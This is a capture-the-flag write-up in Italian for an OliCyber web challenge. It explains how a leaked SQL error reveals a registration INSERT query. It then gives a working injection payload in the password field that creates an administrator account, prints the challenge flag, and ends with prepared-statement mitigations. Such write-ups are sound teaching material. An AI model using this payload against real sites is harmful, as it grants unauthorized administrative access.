# Writeup Challenge: Admin's Secret

**Target:** `[http://adminsecret.challs.olicyber.it/](http://adminsecret.challs.olicyber.it/)`

**Flag:** `flag{c0me_se1_div3ntato_admin}`

**Categoria:** Web Security / SQL Injection (INSERT-based Privilege Escalation)

---

### Obiettivo

Registrare un account con privilegi amministrativi (`admin = true`) all'interno dell'applicazione per accedere all'area riservata ed estrarre la flag.

---

### Analisi della Vulnerabilità

1. **Reconnaissance tramite Error-based Discovery:**
Tentando la registrazione con lo username `admin`, l'applicazione restituisce un errore SQL dettagliato che espone la struttura della query interna:

```text
Error: INSERT INTO users(username,password,admin) VALUES ('admin','admin',false);
Duplicate entry 'admin' for key 'PRIMARY'

```

1. **Struttura della Query:**
L'istruzione SQL di registrazione imposta di default il flag del ruolo su `false`:

```sql
INSERT INTO users(username, password, admin) VALUES ('$username', '$password', false);
```

1. **Mancanza di Input Sanitization:**
I valori inviati via `POST` da `/register.php` vengono concatenati direttamente senza prepared statements né escape dei caratteri speciali, rendendo il campo `password` vulnerabile a **SQL Injection in clausola INSERT**.
---

### Risoluzione ed Exploitation

Sfruttando il campo `password`, è possibile chiudere la stringa, forzare il valore booleano `true` per la colonna `admin`, chiudere la tupla dei valori e commentare la parte restante della query.

#### Payload di Registrazione

* **Username:** `ludovico`
* **Password:** `ludovico',true); -- -`

#### Query risultante eseguita sul Database

```sql
INSERT INTO users(username,password,admin) VALUES ('ludovico','ludovico',true); -- -',false);
```

* **Meccanica dell'attacco:**
* L'apice `'` chiude il valore letterale del campo `password`.
* La virgola `,` passa al terzo campo specificato nella firma (`admin`).
* Il valore `true` (o `1`) imposta il ruolo di amministratore.
* La parentesi tonda `)` e il punto e virgola `;` concludono l'istruzione `INSERT`.
* Il commento `-- -` tronca ed elimina il resto della query originale (`',false);`).

---

### Autenticazione e Flag

1. **Login:**
Navigando su `/login.php`, è stato effettuato l'accesso con le credenziali registrate:

* **Username:** `ludovico`
* **Password:** `ludovico',true); -- -`

1. Il server riconosce l'utente come amministratore legittimo nel database e mostra il segreto:

```text
flag{c0me_se1_div3ntato_admin}

```

---

### Mitigazione (Best Practice)

* **Prepared Statements (Query Parametrizzate):**

```php
$stmt = $db->prepare("INSERT INTO users (username, password, admin) VALUES (?, ?, false)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

```

* **Disabilitazione dei messaggi di errore in produzione:** Disattivare il display degli errori del database (`display_errors = Off` in PHP) per impedire la fuga di informazioni strutturali (information disclosure).
